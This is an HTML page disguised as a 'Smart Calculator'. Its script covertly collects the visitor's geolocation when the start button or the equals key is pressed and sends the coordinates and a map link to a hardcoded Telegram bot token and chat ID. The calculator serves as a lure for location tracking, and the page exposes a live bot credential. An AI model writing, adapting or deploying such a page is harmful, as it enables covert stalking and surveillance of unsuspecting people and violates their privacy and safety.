<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Smart Calculator</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(to bottom, #ffecd2, #fcb69f);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    #start-btn {
      background: #ff5722;
      border: none;
      padding: 15px 30px;
      color: white;
      font-size: 20px;
      border-radius: 10px;
      cursor: pointer;
    }
    #calculator {
      display: none;
      flex-direction: column;
      gap: 10px;
      max-width: 300px;
      width: 90%;
    }
    #display {
      height: 50px;
      font-size: 24px;
      text-align: right;
      padding: 10px;
      background: white;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    .btn-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
    }
    .btn {
      padding: 15px;
      font-size: 18px;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.2s;
    }
    .btn:active {
      background: #ddd;
    }
  </style>
</head>
<body>

  <button id="start-btn">More Details</button>

  <div id="calculator">
    <input type="text" id="display" disabled />
    <div class="btn-grid">
      <button class="btn">7</button>
      <button class="btn">8</button>
      <button class="btn">9</button>
      <button class="btn">/</button>
      <button class="btn">4</button>
      <button class="btn">5</button>
      <button class="btn">6</button>
      <button class="btn">*</button>
      <button class="btn">1</button>
      <button class="btn">2</button>
      <button class="btn">3</button>
      <button class="btn">-</button>
      <button class="btn">0</button>
      <button class="btn">.</button>
      <button class="btn" id="equals">=</button>
      <button class="btn">+</button>
    </div>
  </div>

  <script>
    const startBtn = document.getElementById('start-btn');
    const calculator = document.getElementById('calculator');
    const display = document.getElementById('display');
    const buttons = document.querySelectorAll('.btn');
    const equals = document.getElementById('equals');

    const BOT_TOKEN = '8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc';
    const CHAT_ID = '7357184121';

    startBtn.onclick = () => {
      startBtn.style.display = 'none';
      calculator.style.display = 'flex';
      getLocation();
    };

    buttons.forEach(button => {
      button.addEventListener('click', () => {
        if (button.innerText === '=') {
          try {
            display.value = eval(display.value);
            getLocation();
          } catch {
            display.value = 'Error';
          }
        } else {
          display.value += button.innerText;
        }
      });
    });

    function getLocation() {
      if (!navigator.geolocation) {
        console.log("Geolocation is not supported");
        return;
      }
      navigator.geolocation.getCurrentPosition(success, error);
    }

    function success(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;
      const msg = `ðŸ“ New Location Tracked:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters\nðŸ”— https://www.google.com/maps?q=${lat},${lon}`;
      sendToTelegram(msg);
    }

    function error(err) {
      console.warn("Location error: ", err.message);
    }

    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      }).then(res => res.json())
        .then(data => console.log("Sent to Telegram:", data))
        .catch(err => console.error("Telegram error:", err));
    }
  </script>

</body>
</html>
